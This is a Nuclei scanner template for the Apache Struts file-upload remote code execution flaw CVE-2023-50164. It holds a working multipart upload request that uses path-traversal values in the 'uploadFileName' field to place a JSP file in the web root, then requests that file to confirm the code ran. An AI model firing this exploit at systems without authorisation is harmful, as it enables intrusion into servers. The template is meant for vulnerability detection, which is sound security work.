id: struts-file-upload-rce

info:
  name: Apache Struts - Arbitrary File Upload RCE
  author: 00xmora
  severity: critical
  description: |
    Apache Struts CVE-2023-50164 Remote Code Execution.
    This template is generic and requires specifying the vulnerable upload endpoint via the -u flag.
    Example usage:
    nuclei -t cves/2023/cve-2023-50164.yaml -u http://target.com/upload.action
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-50164
    - https://github.com/NikitaPark/CVE-2023-50164-PoC
  classification:
    cve-id: CVE-2023-50164
    cwe-id: CWE-22
  tags: cve,cve2023,struts,rce,fileupload,traversal,intrusive

variables:
  shellname: "shell_{{randstr}}.jsp"
  shellcontent: "<% out.println(\"NUCLEI-RCE-{{randstr}}\"); %>"

requests:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKQeAnc4Qm964UwhY
        Accept-Encoding: gzip

        ------WebKitFormBoundaryKQeAnc4Qm964UwhY
        Content-Disposition: form-data; name="Upload"; filename="{{shellname}}"
        Content-Type: text/plain

        {{shellcontent}}
        ------WebKitFormBoundaryKQeAnc4Qm964UwhY
        Content-Disposition: form-data; name="uploadFileName"

        {{traversal}}webapps/ROOT/{{shellname}}
        ------WebKitFormBoundaryKQeAnc4Qm964UwhY--
    payloads:
      traversal:
        - "../"
        - "../../"
        - "../../../"
    attack: clusterbomb

    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/html"
        part: header

  - method: GET
    path:
      - "{{BaseURL}}/{{shellname}}"

    matchers:
      - type: word
        words:
          - "NUCLEI-RCE-{{randstr}}"
        part: body
